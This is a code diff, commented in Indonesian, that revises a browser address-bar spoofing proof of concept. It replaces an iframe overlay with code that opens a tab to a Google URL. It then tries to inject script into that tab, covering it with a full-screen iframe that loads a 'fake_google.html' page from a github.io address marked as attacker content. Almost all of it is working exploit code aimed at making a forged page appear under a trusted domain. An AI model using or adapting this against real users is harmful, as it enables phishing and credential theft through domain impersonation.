@@ -5,32 +5,30 @@
 
 <script>
 function a() {
-  // Pakai iframe bukan window.open
-  const iframe = document.createElement('iframe');
-  iframe.style.cssText = `
-    position:fixed;inset:0;
-    width:100%;height:100%;
-    border:none;z-index:9999;
-  `;
+  // Step 1 - Buka tab baru ke google.com/csi
+  const tab = window.open(
+    "https://www.google.com/csi", "_blank"
+  );
   
-  // Set src ke google.com/csi
-  iframe.src = "https://www.google.com/csi";
-  document.body.appendChild(iframe);
+  if (!tab) { alert("Blocked!"); return; }
 
-  // Inject ke iframe
+  // Step 2 - Di tab baru, inject iframe
+  // yang load konten dari attacker
   setTimeout(() => {
     try {
-      iframe.contentDocument.write(`
-        <h1 style="color:white;background:black;
-                   padding:40vh 20px;text-align:center;">
-          Address Bar Spoofing
-        </h1>
+      tab.document.write(`
+        <script>
+          const iframe = document.createElement('iframe');
+          iframe.style.cssText = 'position:fixed;inset:0;width:100%;height:100%;border:none;z-index:9999;';
+          iframe.src = 'https://raihanyasa2.github.io/spoof/fake_google.html';
+          document.body.appendChild(iframe);
+        <\/script>
       `);
+      tab.document.close();
     } catch(e) {
-      // Ganti src iframe ke attacker content
-      iframe.src = "data:text/html,<h1>Spoofed!</h1>";
+      console.warn('Failed:', e.message);
     }
-  }, 100);
+  }, 50);
 }
 </script>
 </body>
